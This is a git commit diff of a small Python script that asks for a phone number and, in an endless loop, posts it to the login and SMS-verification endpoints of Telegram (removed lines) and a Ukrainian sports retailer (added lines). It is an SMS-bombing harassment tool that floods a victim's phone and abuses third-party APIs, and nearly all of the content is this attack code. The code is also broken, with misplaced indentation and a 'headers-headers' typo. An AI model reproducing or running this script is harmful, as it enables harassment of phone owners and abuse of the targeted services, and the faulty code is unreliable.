ad6db1bb50b845f863f09a2f24564b08a34eee32
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 18:26:42 +0200

    Add files via upload

--- jj.py
+++ jj.py
@@ -8,9 +8,27 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
 while True:
 
- try:
-     print('Отправлено')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
+try:
+     print('data+')
+     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, data={'phone': "+" + NUMBER})
  except:
-     print('Не доставлено')
+     print('Data+')
+     
+ try:
+     print('data-')
+     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Data-')
+     
+ try:
+     print('json+')
+     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Json+')
+     
+ try:
+     print('json-')
+     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Json-')
      time.sleep(5000)
